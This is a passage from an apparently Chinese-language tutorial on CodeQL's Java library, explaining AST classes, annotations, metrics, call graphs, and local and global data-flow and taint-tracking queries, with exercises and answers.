<span class="variable">m1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map&lt;String, String&gt; m2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br></pre></td></tr></table></figure><p>最后，可以将变量声明为通配符类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;? <span class="keyword">extends</span> <span class="title class_">Number</span>, ? <span class="built_in">super</span> Float&gt; m;</span><br></pre></td></tr></table></figure><p>通配符<code>?</code>扩展<code>Number</code>和<code>super Float</code>由类<code>WildcardTypeAccess</code>表示。与类型参数一样，通配符可能有类型边界。与类型参数不同，通配符可以有上界（如<code>?</code>拓展<code>Number</code>），也可以有下界（如<code>super Float</code>）。类<code>WildcardTypeAccess</code>提供成员谓词<code>getUpperBound</code>和<code>getLowerBound</code>，分别检索上界和下界。<br>对于处理泛型方法，有类<code>GenericMethod</code>、<code>ParameterizedMethod</code>和<code>RawMethod</code>，它们的类名表示了它们对应的泛型方法。</p><h2 id="变量（Variable）"><a href="#变量（Variable）" class="headerlink" title="变量（Variable）"></a>变量（Variable）</h2><p>类<code>Variable</code>表示Java中的的变量，它可以是类的成员字段（无论是静态的还是非静态的）、局部变量或参数。因此，有三个子类适用于这些特殊情况：</p><ul><li><code>Fild</code>表示Java字段。</li><li><code>LocalVariableDecl</code>表示局部变量。</li><li><code>Parameter</code>表示方法或者构造函数的参数。</li></ul><h2 id="抽象语法树（Abstract-syntax-tree）"><a href="#抽象语法树（Abstract-syntax-tree）" class="headerlink" title="抽象语法树（Abstract syntax tree）"></a>抽象语法树（Abstract syntax tree）</h2><p>该类别中的类表示抽象语法树（AST）中的节点，即语句（<code>Stmt</code>）和表达式(<code>Expr</code>)。<br><code>Expr</code> 和<code>Stmt</code>都提供了一些研究程序的抽象语法树的成员谓词。</p><ul><li><code>Expr.getAChildExpr</code>返回给定表达式的子表达式。</li><li><code>Stmt.getAChild</code>返回直接嵌套在给定语句内的语句或表达式。</li><li><code>Expr.getParent</code>和<code>Expr.getParent</code>返回给定AST节点的父节点。<br>例如，以下代码实现查找所有<code>return</code>语句的表达式。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Expr e</span><br><span class="line"><span class="keyword">where</span> e.getParent() instanceof ReturnStmt</span><br><span class="line"><span class="keyword">select</span> e</span><br></pre></td></tr></table></figure>如下代码实现查找所有<code>if</code>语句的子句。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Stmt s</span><br><span class="line"><span class="keyword">where</span> s.getParent() instanceof IfStmt</span><br><span class="line"><span class="keyword">select</span> s</span><br></pre></td></tr></table></figure>上述查询可以查找<code>if</code>语句的<code>then</code>分支和<code>else</code>分支。<br>最后一个例子，实现查找所有方法的方法体。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Stmt s</span><br><span class="line"><span class="keyword">where</span> s.getParent() instanceof <span class="keyword">Method</span></span><br><span class="line"><span class="keyword">select</span> s</span><br></pre></td></tr></table></figure>正如这些示例所示，表达式的父节点并不总是表达式：它也可能是语句，例如，<code>IfStmt</code>。类似地，语句的父节点并不总是语句：它也可以是方法或构造函数。为了解决这个问题，ql的java库提供了两个抽象类<code>ExprParent</code>和<code>StmtParent</code>，前者表示可能是表达式父节点的任何节点，后者表示可能是语句父节点的任何节点。</li></ul><h2 id="元数据（Metadata）"><a href="#元数据（Metadata）" class="headerlink" title="元数据（Metadata）"></a>元数据（Metadata）</h2><p>除了程序代码之外，Java程序还有几种元数据。注解(annotation)和Javadoc注释。由于此元数据对于增强代码分析和作为分析主题本身都很有研究意义，因此QL库定义了用于访问它的类。<br>对于注解，类<code>Annotatable</code>是可以<code>注解</code>的所有程序元素的超类。这包括包、引用类型、字段、方法、构造函数和局部变量。对于每一个这样的元素，其谓词<code>getAnnotation</code>允许您检索该元素可能具有的任何注解。<br>例如，以下代码实现查找构造函数上的所有注释：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor c</span><br><span class="line"><span class="keyword">select</span> c.getAnAnnotation()</span><br></pre></td></tr></table></figure><p>这些注解由类<code>Annotation</code>表示。注解只是类型为<code>AnnotationType</code>的表达式。例如，如下代码仅查找注解为废弃(Deprecated)的构造函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor c, Annotation ann, AnnotationType anntp</span><br><span class="line"><span class="keyword">where</span> ann <span class="operator">=</span> c.getAnAnnotation() <span class="keyword">and</span></span><br><span class="line">    anntp <span class="operator">=</span> ann.getType() <span class="keyword">and</span></span><br><span class="line">    anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;Deprecated&quot;)</span><br><span class="line"><span class="keyword">select</span> ann</span><br></pre></td></tr></table></figure><p>对于Javadoc，类<code>Element</code>有一个成员谓词<code>getDoc</code>，它返回<code>Document</code>对象，然后可以查询它表示的Javadoc注释。<br>例如，以下代码实现查找在私有字段上Javadoc注释：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Field f, Javadoc jdoc</span><br><span class="line"><span class="keyword">where</span> f.isPrivate() <span class="keyword">and</span></span><br><span class="line">    jdoc <span class="operator">=</span> f.getDoc().getJavadoc()</span><br><span class="line"><span class="keyword">select</span> jdoc</span><br></pre></td></tr></table></figure><p>类<code>Javadoc</code>将整个<code>Javadoc</code>注释表示为<code>JavadocElement</code>节点树，可以使用成员谓词<code>getAChild</code>和<code>getParent</code>遍历这些节点。<br>例如，如下代码实现查找私有字段的Javadoc注释中找到所有<code>@author</code>标记：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Field f, Javadoc jdoc, AuthorTag at</span><br><span class="line">where f.isPrivate() and</span><br><span class="line">    jdoc = f.getDoc().getJavadoc() and</span><br><span class="line">    at.getParent+() = jdoc</span><br><span class="line">select at</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在第5行，使用getParent+捕获嵌套在Javadoc注释中任何深度的标记。</span><br></pre></td></tr></table></figure><h2 id="指标-Metrics"><a href="#指标-Metrics" class="headerlink" title="指标(Metrics)"></a>指标(Metrics)</h2><p>标准的qljava库为计算Java程序元素的度量提供了广泛的支持。为了避免用太多与度量计算相关的成员谓词来表示这些元素的类负担过重，这些谓词可以在委托类上使用。<br>总共有六个这样的类：<code>MetricElement、MetricPackage、MetricRefType、MetricField、MetricCallable和MetricStmt。</code>相应的元素类各自提供一个成员谓词getMetrics，可用于获取委托类的实例，然后可以对该实例执行度量计算。<br>例如，以下代码实现查找所有圈复杂度大于40的方法。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> m, MetricCallable mc</span><br><span class="line"><span class="keyword">where</span> mc <span class="operator">=</span> m.getMetrics() <span class="keyword">and</span></span><br><span class="line">    mc.getCyclomaticComplexity() <span class="operator">&gt;</span> <span class="number">40</span></span><br><span class="line"><span class="keyword">select</span> m</span><br></pre></td></tr></table></figure><h2 id="调用图（Call-Graph）"><a href="#调用图（Call-Graph）" class="headerlink" title="调用图（Call Graph）"></a>调用图（Call Graph）</h2><p>从Java代码库生成的CodeQL数据库包含有关程序调用图的预计算信息，即给定调用在运行时可以调用哪些方法或构造函数。<br>上面介绍的类<code>Callable</code>包括方法和构造函数。调用表达式抽象成类<code>Call</code>，包括方法调用、新表达式和使用<code>this</code>或<code>super</code>的显式构造函数调用。<br>我们可以使用谓词<code>Call.getCallee</code>来找出特定调用表达式引用的方法或构造函数。<br>例如，以下查询查找对名为<code>println</code>的方法的所有调用:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Call</span> c, <span class="keyword">Method</span> m</span><br><span class="line"><span class="keyword">where</span> m <span class="operator">=</span> c.getCallee() <span class="keyword">and</span></span><br><span class="line">    m.hasName(&quot;println&quot;)</span><br><span class="line"><span class="keyword">select</span> c</span><br></pre></td></tr></table></figure><p>相反，<code>Callable.getAReference</code>返回引用它的调用。<br>例如，如下代码实现查询从未调用过的方法和构造函数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Callable c</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(c.getAReference())</span><br><span class="line"><span class="keyword">select</span> c</span><br></pre></td></tr></table></figure><h1 id="分析Java中的数据流-Analyzing-data-flow-in-Java"><a href="#分析Java中的数据流-Analyzing-data-flow-in-Java" class="headerlink" title="分析Java中的数据流(Analyzing data flow in Java)"></a>分析Java中的数据流(Analyzing data flow in Java)</h1><p>本节主要介绍了如何利用QL规则来分析Java中的数据流。</p><h2 id="本地数据流-Local-data-flow"><a href="#本地数据流-Local-data-flow" class="headerlink" title="本地数据流(Local data flow)"></a>本地数据流(Local data flow)</h2><p>本地数据流主要是单个方法内的数据流，或者方法调用的数据流。本地数据流通常比全局数据流更容易、更快、更准确，并且可以满足很多查询。</p><h3 id="使用本地数据流（Using-local-data-flow）"><a href="#使用本地数据流（Using-local-data-flow）" class="headerlink" title="使用本地数据流（Using local data flow）"></a>使用本地数据流（Using local data flow）</h3><p>模块<code>DataFlow</code>包含本地数据流库，该模块中定义了<code>Node</code>类，用来描述数据可以流经的元素。<code>Node</code>也划分为了表达式节点<code>ExprNode</code>和参数节点<code>ParameterNode</code>。开发人员可以使用成员谓词<code>asExpr</code>和<code>asParameter</code>将数据流节点和表达式与参数一一对应。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Node &#123;</span><br><span class="line">  <span class="comment">/** Gets the expression corresponding to this node, if any. */</span></span><br><span class="line">  Expr asExpr() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Gets the parameter corresponding to this node, if any. */</span></span><br><span class="line">  <span class="keyword">Parameter</span> asParameter() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用谓词<code>exprNode</code>和<code>parameterNode</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the node corresponding to expression `e`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ExprNode exprNode(Expr e) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the node corresponding to the value of parameter `p` at function entry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ParameterNode parameterNode(<span class="keyword">Parameter</span> p) &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>当存在从节点<code>NodeFrom</code>到<code>NodeTo</code>的数据流时，谓词<code>localFlowStep(Node nodeFrom, Node nodeTo)</code>成立。开发人员可以使用<code>+</code>或<code>*</code>运算符递归的应用谓词，或者使用预定义的递归谓词<code>LocalFlow</code>(相当于<code>LocalFlowStep*</code>)。<br>例如，以下代码可以查询从参数<code>source</code>到表达式<code>sink</code>点的所有本地数据流(0步或多步)。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h3 id="本地污点跟踪-Using-local-taint-tracking"><a href="#本地污点跟踪-Using-local-taint-tracking" class="headerlink" title="本地污点跟踪(Using local taint tracking)"></a>本地污点跟踪(Using local taint tracking)</h3><p>本地污点跟踪通过包含非保留值(外部流入)流步骤来扩展局部数据流。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> x;</span><br><span class="line"><span class="type">String</span> <span class="variable">y</span> <span class="operator">=</span> temp + <span class="string">&quot;, &quot;</span> + temp;</span><br></pre></td></tr></table></figure><p>如果x被污染了，那么y也被污染了。<br>本地污染跟踪库位于模块<code>TaintTracking</code>中。与本地数据流一样，如果存在从节点<code>nodeFrom</code>到节点<code>nodeTo</code>的污点传播路径，则谓词<code>localTaintStep（DataFlow:：Node nodeFrom，DataFlow:：Node nodeTo）</code>成立。开发人员可以使用<code>+</code>和<code>*</code>运算符递归应用谓词，或者使用预定义的递归谓词<code>localTaint</code>，这相当于<code>localTaintStep*</code>。<br>例如，以下代码可以查询从参数<code>source</code>到表达式<code>sink</code>点的所有污点传播路径(0步或多步)。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h3 id="举例-Example"><a href="#举例-Example" class="headerlink" title="举例(Example)"></a>举例(Example)</h3><p>如下代码查询流入到<code>new FileReader()</code>的文件名称。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor fileReader, <span class="keyword">Call</span> <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) <span class="keyword">and</span></span><br><span class="line">    call.getCallee() <span class="operator">=</span> fileReader</span><br><span class="line"><span class="keyword">select</span> call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然而，上述查询只能查找流入到<code>new FileReader()</code>的入参，不能溯源可以传递到它的所有值。所以，开发人员可以使用本地数据流分析可以流入到参数的所有表达式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java </span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor fileReader, <span class="keyword">Call</span> <span class="keyword">call</span>, Expr src</span><br><span class="line"><span class="keyword">where</span> </span><br><span class="line">    fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) <span class="keyword">and</span> </span><br><span class="line">    call.getCallee() <span class="operator">=</span> fileReader <span class="keyword">and</span> </span><br><span class="line">    DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">select</span> src</span><br></pre></td></tr></table></figure><p>然后我们可以使源更加具体，例如外部参数。此查询查找外部参数传递给新FileReader（..）的位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java </span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor fileReader, <span class="keyword">Call</span> <span class="keyword">call</span>, <span class="keyword">Parameter</span> p</span><br><span class="line"><span class="keyword">where</span> </span><br><span class="line">    fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;)</span><br><span class="line">    <span class="keyword">and</span></span><br><span class="line">    call.getCallee() <span class="operator">=</span> fileReader</span><br><span class="line">    <span class="keyword">and</span> </span><br><span class="line">    DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">select</span> p</span><br></pre></td></tr></table></figure><p>如下查询实现查找未对字符串进行硬编码的一些调用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.StringFormat</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> StringFormatMethod format, MethodAccess <span class="keyword">call</span>, Expr formatString </span><br><span class="line"><span class="keyword">where</span> </span><br><span class="line">    call.getMethod()<span class="operator">=</span>format <span class="keyword">and</span> </span><br><span class="line">    call.getArgument(format.getFormatStringIndex()) <span class="operator">=</span> formatString <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span> <span class="keyword">exists</span>(DataFlow::Node source, DataFlow::Node sink <span class="operator">|</span> </span><br><span class="line">        DataFlow::localFlow(source,sink) <span class="keyword">and</span></span><br><span class="line">        source.asExpr() instanceof StringLiteral <span class="keyword">and</span> </span><br><span class="line">        sink.asExpr() <span class="operator">=</span> formatString</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">call</span>,&quot;Argument to String format method isn&#x27;t hard-coded.&quot;</span><br></pre></td></tr></table></figure><h3 id="练习（Exercises）"><a href="#练习（Exercises）" class="headerlink" title="练习（Exercises）"></a>练习（Exercises）</h3><p>练习1：编写一个查询，使用本地数据流查找所有用于创建java.net.URL的硬编码字符串。</p><h2 id="全局数据流（Global-data-flow）"><a href="#全局数据流（Global-data-flow）" class="headerlink" title="全局数据流（Global data flow）"></a>全局数据流（Global data flow）</h2><p>全局数据流比本地数据流更强大，可以跟踪整个程序中的数据流。相应地，全局数据流不如本地数据流精确， 并且需要更多时间和内存来分析全局数据的流动。</p><h3 id="使用全局数据流-Using-global-data-flow"><a href="#使用全局数据流-Using-global-data-flow" class="headerlink" title="使用全局数据流(Using global data flow)"></a>使用全局数据流(Using global data flow)</h3><p>开发人员可以通过扩展类<code>DataFlow::COnfiguration</code>来使用全局数据流库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class MyDataFlowConfiguration extends DataFlow::Configuration&#123;</span><br><span class="line">    MyDataFlowConfiguration()&#123;</span><br><span class="line">        this <span class="operator">=</span> &quot;MyDataFlowConfiguration&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开发人员可以定义如下谓词：</p><ul><li><code>isSource</code>，定义数据可能从何处流入。(必须重写)</li><li><code>isSink</code>，定义数据可能的汇聚点。(必须重写)</li><li><code>isBarrier</code>，限定数据流。(可选)</li><li><code>isAdditionalFlowStep</code>，添加额外的数据流动。(可选)<br>特征谓词<code>MyDataFlowConfiguration()</code>定义了配置的名称，因此<code>&quot;MyDataFlowConfiguration&quot;</code>应该是唯一的名称，例如，类的名称。<br>谓词<code>hasFlow(DataFlow::Node source,DataFlow::Node sink)</code>可以检测数据在source点和sink点之间是否能流通。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> MyDataFlowConfiguration dataflow ,DataFlow::Node source, DataFlow::Node sink</span><br><span class="line"><span class="keyword">where</span> dataflow.hasFlow(source,sink)</span><br><span class="line"><span class="keyword">select</span> source, &quot;Data flow to $@.&quot;, sink, sink.toString()</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用全局污点追踪"><a href="#使用全局污点追踪" class="headerlink" title="使用全局污点追踪"></a>使用全局污点追踪</h3><p>全局污染跟踪是对全局数据流的跟踪，就像局部污染跟踪是对局部数据流的跟踪一样。也就是说，全局污染跟踪通过额外的非值保留步骤扩展了全局数据流。开发人员可以通过扩展类<code>TaintTracking:：Configuration</code>来使用全局污染跟踪库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开发人员可以定义如下谓词：</p><ul><li><code>isSource</code>，定义污点可能从何处流入。(必须重写)</li><li><code>isSink</code>，定义污点可能的汇聚点。(必须重写)</li><li><code>isBarrier</code>，限定污点流。(可选)</li><li><code>isAdditionalFlowStep</code>，添加额外的污点流动。(可选)<br>和全局数据流类似，特征谓词<code>MyTaintTrackingConfiguration()</code>定义了配置的名称，因此<code>&quot;MyTaintTrackingConfiguration&quot;</code>应该是唯一的名称。谓词<code>hasFlow(DataFlow::Node source,DataFlow::Node sink)</code>可以检测污点数据在source点和sink点之间是否能流通。</li></ul><h3 id="数据源（Flow-Sources）"><a href="#数据源（Flow-Sources）" class="headerlink" title="数据源（Flow Sources）"></a>数据源（Flow Sources）</h3><p>数据流库包含一些定义好的数据源。例如类<code>RemoteFlowSource</code>（定义在<code>semmle.code.java.dataflow.FlowSource</code>中）涵盖了一些可能是外部用户控制的数据源，这对查找安全问题很有用。</p><h3 id="例子（Example）"><a href="#例子（Example）" class="headerlink" title="例子（Example）"></a>例子（Example）</h3><p>如下查询，将外部用户输入看做污点源来做污点追踪。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123;</span><br><span class="line">    this <span class="operator">=</span> &quot;...&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="练习（Exercises）-1"><a href="#练习（Exercises）-1" class="headerlink" title="练习（Exercises）"></a>练习（Exercises）</h3><p>练习2：编写查询，使用全局数据流查找用于创建<code>java.net.URL</code>的所有硬编码字符串。<br>练习3：编写一个表示来自<code>java.lang.System.getenv（..）</code>源的类。<br>练习4：使用2和3的答案，编写一个查询，查找从getenv到java.net.URL的所有全局数据流。</p><h2 id="练习答案"><a href="#练习答案" class="headerlink" title="练习答案"></a>练习答案</h2><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Constructor url, <span class="keyword">Call</span> <span class="keyword">call</span>, StringLiteral src</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  url.getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;) <span class="keyword">and</span></span><br><span class="line">  call.getCallee() <span class="operator">=</span> url <span class="keyword">and</span></span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">select</span> src</span><br></pre></td></tr></table></figure><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class Configuration extends DataFlow::Configuration &#123;</span><br><span class="line">  Configuration() &#123;</span><br><span class="line">    this <span class="operator">=</span> &quot;LiteralToURL Configuration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof StringLiteral</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Call</span> <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> DataFlow::Node src, DataFlow::Node sink, Configuration config</span><br><span class="line"><span class="keyword">where</span> config.hasFlow(src, sink)</span><br><span class="line"><span class="keyword">select</span> 